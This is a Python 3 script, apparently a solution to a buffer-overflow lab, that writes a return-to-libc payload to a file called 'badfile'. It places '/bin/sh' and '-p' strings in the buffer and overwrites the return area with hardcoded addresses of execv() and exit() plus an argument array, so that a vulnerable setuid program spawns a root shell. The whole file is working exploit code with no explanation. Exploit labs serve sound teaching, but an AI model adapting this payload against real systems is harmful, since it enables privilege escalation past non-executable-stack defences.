#!/usr/bin/python3
import sys
# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

buffer_start = 0xbfffeb6e
sh_str = b"/bin/sh\x00"
p_str = b"-p\x00"

sh_str_offset = 100
p_str_offset = 110
sh_addr = buffer_start + sh_str_offset
p_addr = buffer_start + p_str_offset

content[sh_str_offset:sh_str_offset+len(sh_str)] = sh_str
content[p_str_offset:p_str_offset+len(p_str)] = p_str

offset = 42
Y = offset + 4
execv_addr = 0xb7eb8780 # The address of execv()
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = offset + 8
exit_addr = 0xb7e369d0 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

X = offset + 12
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

W =offset + 16
argv = buffer_start + offset + 20
content[W:W+4] = (argv).to_bytes(4, byteorder='little')

# Create argument array
content[offset + 20:offset + 24] = (sh_addr).to_bytes(4, byteorder='little')
content[offset + 24:offset + 28] = (p_addr).to_bytes(4, byteorder='little')
content[offset + 20 +8:offset + 20 +12] = (0x00).to_bytes(4, byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
	f.write(content)
